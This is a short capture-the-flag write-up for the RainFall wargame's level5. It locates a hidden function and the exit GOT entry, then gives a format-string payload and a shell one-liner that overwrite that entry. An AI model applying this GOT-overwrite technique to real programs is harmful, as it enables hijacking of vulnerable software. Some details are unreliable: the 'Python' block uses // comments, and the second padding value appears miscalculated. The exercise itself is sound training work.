```bash
evel5@RainFall:~$ readelf -s level5 | grep o
Symbol table '.dynsym' contains 10 entries:
     5: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
Symbol table '.symtab' contains 73 entries:
    31: 08048420     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    32: 0804984c     1 OBJECT  LOCAL  DEFAULT   25 completed.6159
    33: 08049850     4 OBJECT  LOCAL  DEFAULT   25 dtor_idx.6161
    39: 080485a0     0 FUNC    LOCAL  DEFAULT   13 __do_global_ctors_aux
    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    59: 08049844     0 OBJECT  GLOBAL HIDDEN    24 __dso_handle
    67: 080484a4    30 FUNC    GLOBAL DEFAULT   13 o

```

```bash
(gdb) x o
0x80484a4 <o>:	0x83e58955
```

address of function o: `080484a4` == `\xa4\x84\x04\x08`

```bash
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

offset of buffer of printf is `3`

---

```bash
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

Address of exit is `08049838` == `\x38\x98\x04\x08`

## Payload

value to write = adress of o = `0x080484a4` = `134513828`

Lets do 2 writes

value 1: `0x 0000 84a4` = `33956`
value 2: `0x 0001 0804` = `67588`

cible 1 = `08049838` 				== `\x38\x98\x04\x08`

cible 2 = cible1 + 2 ==  `804983A`	== `\x3a\x98\x04\x08`

```python
exploit = ""
exploit += "\x38\x98\x04\x08"	//cible1
exploit += "\x3a\x98\x04\x08"	//cible2
exploit += "%3$33948x"			// padding to get to value 1 (33956 - 8 = 33948)
exploit += "%3$n"				//write cible 1
exploit += "%3$33624x"			//paddding to get to value 2 (67588 - 33956 - 8 = 33624)
exploit += "%4$n"
```

```bash
(python -c 'print ("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%3$33948x" + "%3$n" + "%3$33624x" + "%4$n")';cat) | ./level5
```
